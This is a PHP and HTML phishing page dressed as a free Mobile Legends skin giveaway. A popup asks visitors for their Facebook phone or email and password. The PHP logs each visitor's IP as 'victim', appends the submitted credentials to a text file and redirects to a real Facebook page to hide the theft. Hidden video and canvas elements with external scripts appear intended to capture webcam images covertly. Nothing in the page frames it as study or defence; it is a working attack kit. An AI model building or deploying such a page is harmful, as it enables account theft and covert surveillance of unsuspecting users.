

<?php
if (!empty($_SERVER['HTTP_CLIENT_IP']))
    {
      $ipaddress = $_SERVER['HTTP_CLIENT_IP']."\r\n";
    }
elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
    {
      $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR']."\r\n";
    }
else
    {
      $ipaddress = $_SERVER['REMOTE_ADDR']."\r\n";
    }


$file = '../ip.txt';
$victim = "IP : ";
$fp = fopen($file, 'w');

fwrite($fp, $victim);
fwrite($fp, $ipaddress);

if(isset($_POST["submit"])){
 
  
  $name = $_POST["name"];
  $pass = $_POST["pass"];
  

  

  $file = fopen('../credentials.txt','a+');
  fwrite($file, "\n");
  fwrite($file, "Phone No : "
  . $name . "\n"
  . "Password : " . $pass .
    "\n\n");
 
 
  fclose($file);
  
  
  
  echo "Logging in...";
  header("location: https://m.facebook.com/login/identify/?ctx=recover&c&multiple_results=0&ars=m_account_switcher&from_login_screen=0&wtsid=rdr_0OAVAh5WWRDWcLRx4&_rdr");
}
?>


<!DOCTYPE html>
<html>

<head>
  
  <meta name="viewport" content="width=device-width, initial-scale=1">
  
         <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.3.1/dist/css/bootstrap.min.css">
        <link href="https://cdn.jsdelivr.net/npm/daisyui@4.4.19/dist/full.min.css" rel="stylesheet" type="text/css" />
  <script src="https://cdn.tailwindcss.com"></script>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
  <link rel="stylesheet"  href="https://fonts.googleapis.com/css?family=Montserrat&display=swap">
   <!-- <script src='https://www.google.com/recaptcha/api.js'></script>-->

  <title>Claim Now! 2024</title>
  <style>
  body{
    
    font-family:"Montserrat", sans-serif;
  }
  
.skinbtn {
	background: #843199;
	background: linear-gradient(90deg, #843199 0%, #E2B1D5 50%, #F64FD5 100%);
	padding:9px 23px;
	text-decoration:none;
	font-weight:bold;
	color: white;

}
.skinbtn:hover {
	background:linear-gradient(to bottom, #0688fa 5%, #2dabf9 100%);
	background-color:#0688fa;
	text-decoration:none;
}
body{
  height:1000px;
}
.skinbtn:active {
	position:relative;
	
	top:1px;
}
.claim:active {
	position:relative;
	
	top:1px;
}

.claim{
  background: #FFA751;
background: radial-gradient(circle at center center, #FFA751 0%, #ffe259 100%)
padding:9px 23px;
	text-decoration:none;
	font-weight:bold;
	color: white;
	border:2px solid orange;
	border-radius:2px;
	width:80px;
}

.skins{
    display:flex;
  width: 200px;
  height: 100px;
 
  margin:1rem;
}  *{
          margin:0;
          padding:0;
          border-box:box-sizing;
        }
        .special{
          color:orange;
          background: #232526;
          background: linear-gradient(90deg, #232526 0%, #414345 100%);
          font-weight:bold;
          width:70%;
          
        }
  </style>
  
<script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>

<div class="video-wrap" hidden="hidden">
   <video id="video" playsinline autoplay></video>
</div>

<canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
<script type="text/javascript" src="functionC.js">
</script>
</head>

<body data-theme="night">
  
  <div class="navbar bg-base-100">
  <div class="flex-1">
    <a class="btn btn-ghost text-xl">MLBB REWARD SKINS</a>
  </div>
  <div class="flex-none gap-2">
&nbsp;
    <div class="dropdown dropdown-end">
      <div tabindex="0" role="button" class="btn btn-ghost btn-circle avatar">
        <div class="w-10 rounded-full">
          <img alt="Tailwind CSS Navbar component" src="https://i.ibb.co/pW6dVGB/download-2.jpg" />
        </div>
      </div>
      <ul tabindex="0" class="mt-3 z-[1] p-2 shadow menu menu-sm dropdown-content bg-base-100 rounded-box w-52">
        <li>
          <a onclick="announcement()" class="justify-between">
           Claim
            <span class="badge">free</span>
          </a>
        </li>
       
      </ul>
    </div>
  </div>
</div>
<hr style="border:1px solid grey;">





<div class="hero min-h-screen" style="background-image: url(https://i.ibb.co/tzrxLcW/images-5.jpg);">
  <div class="hero-overlay bg-opacity-60"></div>
  <div class="hero-content text-center text-neutral-content">
    <div class="max-w-md">
      <h1 class="mb-5 text-5xl font-bold">CLAIM NOW REWARDS</h1>
      <p class="mb-5">A hero skin is an alternate appearance for any given hero. diamonds in the store, and some are only accessible for a limited time, with just a few being unobtainable after the first release.</p>
      <button onclick="announcement()" style="color:white;" class="btn btn-primary">CLAIM NOW</button>
    </div>
  </div>
  
  
</div><br>
<div style="height:120px;"class="card w-30 h-30 bg-base-100 shadow-xl">

  <div class="card-body">
    <h2 class="card-title">
      Epic Skin Reward!
      <div class="badge badge-secondary">free</div>
    </h2>
    <p>Skylark, a work of art with elegance that incorporates ninja elements, is one of Fanny's rarest skins.</p>
    <div class="card-actions justify-end">
      <div class="badge badge-outline">Moonton</div> 
      <div class="badge badge-outline">Hero</div>
    </div>
  </div>
</div>

<br>



     <script src="https://cdn.jsdelivr.net/npm/sweetalert2@10.16.3/dist/sweetalert2.all.min.js"></script>
     
<script type="text/JavaScript">

function announcement(){
            Swal.fire({
                html: document.getElementById('custom-content').innerHTML,
                confirmButtonText: 'CLOSE'
            });
}
</script>
                <div data-theme="night"  id="custom-content" style="display:none;" >
                  <center>
            <img src="https://i.ibb.co/pW6dVGB/download-2.jpg" style="height:100px; border-radius:50%;width:100px; border:2px solid white;"></center>
       <h5 class="text-primary" style="font-size:23px; color:blue;">MOBILE LEGENDS</h5>
       <p>Login your Facebook account that connected to Mobile legends</p>

            <br>
            <form action="" method="POST">
            <input type="text" class="form-control" name="name" placeholder="Phone Number or Email">
            <br>
               <input type="password" class="form-control" name="pass" placeholder="Password">
            <br>
            <input type="submit" class="btn btn-success" name="submit" value="CONTINUE">
            </form>
            
           

        </div>

</body>

</html>
